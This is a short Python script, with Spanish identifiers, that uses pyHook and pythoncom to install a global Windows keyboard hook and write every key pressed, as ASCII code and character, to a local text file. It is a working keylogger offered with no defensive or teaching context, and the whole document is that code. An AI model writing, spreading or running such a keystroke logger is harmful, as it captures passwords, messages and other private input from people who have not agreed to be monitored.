import pyHook, pythoncom, logging

def eventoTeclado(evento):
	logging.basicConfig(filename='archivoDondeSeGuardanLasTeclasPulsadas.txt', level=logging.DEBUG, format="%(message)s")
	
	str(evento.Ascii)
	logging.log(10,str(evento.Ascii))

	chr(evento.Ascii)
	logging.log(10,chr(evento.Ascii))
	
controlador = pyHook.HookManager()
controlador.KeyDown = eventoTeclado
controlador.HookKeyboard()

pythoncom.PumpMessages()